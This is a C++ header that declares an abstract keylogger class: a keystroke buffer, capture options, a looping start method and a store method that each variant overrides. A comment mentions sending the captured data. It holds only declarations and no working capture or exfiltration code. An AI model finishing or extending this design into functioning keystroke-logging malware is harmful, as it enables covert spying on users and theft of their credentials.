#ifndef _KEYLOGGER_HPP_
#define _KEYLOGGER_HPP_

using namespace std;

class keylogger
{
    public :
  		string* a_buffer;
  		size_t a_buffer_size;
      bool a_no_click;
      bool a_alphabet_only;
      bool a_store_character;
      int a_timer;

      /*
  		* Constructor with parameters
  		*
  		* Initialize the keylogger
  		*
  		* p_buffer_size : Maximum size of buffer, to avoid storage or sending data at each
      * entry
  		*/
		keylogger();

    /*
    * Destructor
    */
		virtual ~keylogger();

    /*
    * Did an infinite loop and store and call method store
    */
    virtual void start();

    /*
    * ABSTRACT METHOD
    *
    * This method is called to store entry, need to be redifined for each specific keylogger
    */
		virtual void store() = 0;

    /*
    * Setter of a_buffer_size
    */
    virtual void set_buffer_size(size_t p_new_buffer_size);

    /*
    * Setter of a_no_click
    */
    virtual void set_no_click(bool p_no_click);

    /*
    * Setter of a_alphabet_only
    */
    virtual void set_alphabet_only(bool p_alphabet_only);

    /*
    * Setter of a_store_character;
    */
    virtual void set_store_character(bool p_store_character);

    /*
    * Setter of a_timer;
    */
    virtual void set_timer(int p_timer);
};

#endif
